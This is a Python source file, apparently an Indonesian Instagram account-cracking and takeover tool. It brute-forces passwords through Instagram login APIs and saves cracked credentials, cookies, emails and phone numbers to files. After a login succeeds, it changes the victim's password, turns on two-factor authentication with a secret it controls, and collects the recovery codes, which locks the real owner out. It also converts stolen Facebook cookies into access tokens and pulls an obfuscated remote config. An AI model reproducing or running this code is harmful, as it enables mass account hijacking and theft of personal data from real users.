 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                  ''')
                    else:
                       print(f'''\r                                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                               ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
                 elif 'redirection_to_checkpoint' in self.responsIG.text.replace('\\',''):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                         
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Manual
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                          ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
             self.Loop +=1
             try:
                 _status = _status
             except: _status = '200'
             Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
         except (AttributeError,requests.exceptions.ConnectionError):
             time.sleep(10)

   def SmartLockGoogle(self, users, password):
       global file_ok
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                  'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                  'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                  'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                  'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                  'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                  'x-ig-device-id': str(uuid.uuid4()),
                  'x-ig-family-device-id': str(uuid.uuid4()),
                  'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'x-ig-app-id': '567067343352427',
                  'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
               })

               self.SmartData = {
                  'params': '{"client_input_params":{"device_id":"'+ str(session.headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(users)+'","machine_id":"'+str(session.headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(users)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(session.headers['x-ig-family-device-id'])+'","device_id":"'+str(session.headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                  'bk_client_context': '{"bloks_version":"'+ str(session.headers['x-bloks-version-id']) +'","styles_id":"instagram"}',
                  'bloks_versioning_id': str(session.headers['x-bloks-version-id'])
               }
               self.Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.SmartData['params']), urllib.parse.quote(self.SmartData['bk_client_context']), self.SmartData['bloks_versioning_id'])
               session.headers.update({'content-length':str(len(self.Query))})
               _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=self.SmartData, allow_redirects = True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(_respon.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''

                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                                                     
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                             ''')

                    else:
                       print(f'''\r                                               
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                                  ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                        
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}SmartLock
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                             ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
           self.Loop +=1
           _status = '200'
           Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(10)

   def data_graph(self, xxx):
       data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
       }
       return(data)

   def headers_graph(self, xxx):
       headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
       }
       return(headers)

   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           resp = requests.Session().get(url, cookies = {'cookie': cokie}).text
           head = self.headers_graph(resp)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
               'x-ig-app-id': '1217981644879628',
           })
           data = self.data_graph(resp)
           data.update({
               'fb_api_caller_class':'RelayModern',
               'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'variables':json.dumps({"input":{"client_mutation_id":f"{self.ClientId(resp)}","actor_id":f"{self.AccountId(resp)}","account_id":f"{self.AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
               'doc_id':'6282672078501565',
           })
           get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
           if "totp_key" in str(get_p):
              xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
              hpsx = xnxx.replace(' ','')
              kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
              self.info.update({'SecretKey':hpsx})
              self.AktifkanA2f(cokie, kode, resp, hpsx)
           else:
              self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       return self.info

   def AktifkanA2f(self, cokie, code, resp, auth):
       try:
           xxx, ua = resp, 'Instagram 163.0.0.45.122 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)'
           head = self.headers_graph(resp)
           head.update({
              'Host': 'accountscenter.instagram.com',
              'x-ig-app-id': '1217981644879628',
              'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
              'content-type': 'application/x-www-form-urlencoded',
              'user-agent': ua,
              'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
           })
           data = {'av':self.AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
           ondw = requests.Session().post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
           if '"success":true' in str(ondw):
              self.info.update({'success-a2f':True})
              reco = self.get_code(cokie, resp)
              if reco is not None:
                 try:
                     kode = reco['data']['xfb_two_factor_regenerate_recovery_codes']['recovery_codes']
                     self.info.update({'kode-pemulihan':kode})
                 except:
                     self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
              else:self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
           else:
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak ada'})

   def AccountId(self, xxx):
       try:
           Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
           return(Userid)
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

   def ClientId(self, xxx):
       try:
           Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
           return Clients
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

   def get_code(self, cokie, response):
       try:
           data = self.data_graph(response)
           clin = self.ClientId(response)
           user = data['av']
           data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'24010978991879298'})
           head = self.headers_graph(response)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'sec-ch-ua': 'Not_A',
               'x-ig-app-id': '936619743392459',
               'sec-ch-ua-mobile': '?0',
               'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
               'viewport-width': '980',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
               'x-fb-lsd': '7g42wKUg5uJbzrClbnTyuB',
               'content-type': 'application/x-www-form-urlencoded',
               'x-asbd-id': '129477',
               'dpr': '2',
               'sec-ch-ua-full-version-list': 'Not_A',
               'sec-ch-prefers-color-scheme': 'light',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://accountscenter.instagram.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',})
           reqs = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cokie}, data=data, headers=head).json()
           return reqs
       except Exception as e:
           return None

   def OverPower(self):
       while True:
         try:
             self.uid = str(uuid.uuid4())
             self.ps  = requests.get(zlib.decompress(KamuNya)).json()

             self.NazriDev.update({'data':self.ps['xyraacode']['MidConfig'],'curl':self.ps['CURLpost']['xyraacodeURL'],'meta':self.ps['Headers']['xyraacodeHEAD']})
             self.data = self.NazriDev['data']
             self.data.update({
                  'device_id':'android-%s'%(self.Android_ID('null','null').hexdigest()[:16]),
                  'custom_device_id':str(self.uid),
                }
             )
             self.meta = self.NazriDev['meta']
             self.meta.update({
                  'x-ig-device-id': str(self.uid),
                  'x-ig-android-id': str(self.data['device_id']),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'content-length': str(len(self.data))
                }
             )
             self.resp = requests.post(self.NazriDev['curl'], data=self.data, headers=self.meta)
             self.appc = self.resp.headers['ig-set-x-mid']
             if self.appc not in self.MID:
                if len(self.MID) <6:
                   self.MID.append(self.appc)
                else: break
         except: break

   def PasswordNEW(self):
       self.abd = ['ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz']
       self.san = ''.join(random.choice(random.choice(self.abd)) for _ in range(12))
       return(self.san)

   def SandiBaru(self, cookie, old_pw):
       try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',})
            data      = self.data_graph(resp)
            old_pwx   = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),old_pw)
            self.sand = self.PasswordNEW()
            new_pw    = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),self.sand)
            data.update({'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation','variables': '{"account_id":"'+data['av']+'","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"'+str(old_pwx)+'"},"new_password_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"client_mutation_id":"'+self.ClientId(resp)+'","should_logout":false}','doc_id': '6616377658461852',})
            respon = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cookie}, data=data, headers=head).text
            if '"success":true' in str(respon):return new_pw.split(':')[3]
            else:return old_pwx.split(':')[3]
       except:return old_pw

class MainDev:

   def __init__(self)->None:
       self.data, self.host = {}, 'https://m.facebook.com'
       self.token_app = '1348564698517390|007c0a9101b9e1c8ffab727666805038'

   def Run(self)->str:
       if len(sys.argv) == 2:
          if sys.argv[1].split('=')[1] == 'True':
             if os.path.isfile('data/FB-login.txt') is False:
                self.ok = True
                while self.ok:
                    self.ok = self.GetingCode(input('FBcookie: '))
                    if 'EAAT' in str(self.ok): break
                os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                print('Login Berhasil, Fiture Facebook Sekarang Bisa Di Gunakan.')
                os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                time.sleep(2)
                MAIN().insta()
             else:MAIN().insta()
       else:
          MAIN().insta()

   def GetingCode(self, coki):
       with requests.Session() as r:
         try:
              self.r = r.post(f'https://graph.facebook.com/v2.6/device/login?access_token={self.token_app}').json()
              self.user_code, self.code = self.r['user_code'], self.r['code']
              self.r1 = bsp(r.get(f'https://m.facebook.com/device?user_code={self.user_code}', cookies = {'cookie':coki}).text,'html.parser')
              self.ls = ['fb_dtsg','jazoest','qr']
              for self.i in self.r1.find_all('input'):
                  if self.i.get('name') in self.ls: self.data.update({self.i['name']:self.i['value']})
              self.data.update({'user_code':self.user_code})
              self.ul = self.r1.find('form', method='post')['action']
              self.r2 = bsp(r.post(self.host + self.ul, data=self.data, cookies = {'cookie':coki}).text,'html.parser')
              self.data.clear()
              for self.a in self.r2.find_all('input'):
                  if self.a.get('name') == '__CANCEL__':pass
                  else:self.data.update({self.a.get('name','submit'):self.a.get('value')})
              self.r3 = r.post(self.host + self.r2.find('form', method='post')['action'], data=self.data, cookies = {'cookie':coki}).text
              self.r4 = r.post(f'https://graph.facebook.com/v2.6/device/login_status?access_token={self.token_app}&code={self.code}',cookies = {'cookie':coki}).json()['access_token']
              self.rt = '%s|%s'%(coki, self.r4)
              open('data/FB-login.txt','w').write(self.rt)
              return self.r4
         except (KeyError, Exception):
              return True

MainDev().Run()
#MAIN().CariNama()
